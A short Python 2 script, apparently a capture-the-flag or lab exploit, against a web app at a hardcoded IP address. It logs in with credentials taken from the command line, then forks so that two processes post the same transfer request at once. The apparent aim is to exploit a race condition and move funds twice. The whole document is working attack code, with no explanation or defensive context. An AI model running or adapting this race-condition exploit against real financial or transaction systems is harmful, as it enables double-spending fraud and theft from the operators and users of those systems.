#!/usr/bin/python
import urllib2
import os
import time
import cookielib
import urllib
import sys
def createcookie():
    cj=cookielib.CookieJar()
    return cj
def getit(cook):
    url='http://103.10.24.99:11154/index.php'
    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cook))
    opener.addheaders=[('User-Agent','Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Ubuntu/9.10 (karmic) Firefox/3.5.3 GTB7.0')]
    req=opener.open(url,data1)
    data={
                    'account':'2716326389352840192',
                    'amount':'1000',
                    'transfer':'go'
            }
    data=urllib.urlencode(data)
    response=opener.open("http://103.10.24.99:11154/transcation.php",data)
    print response.read()

cook1 = createcookie()
cook2 = createcookie()
data1='login=' + sys.argv[1] + '&pwd=' + sys.argv[2] + '&submit=go'

child_pid = os.fork()
if child_pid == 0:
    getit(cook1)
else:
    getit(cook2)
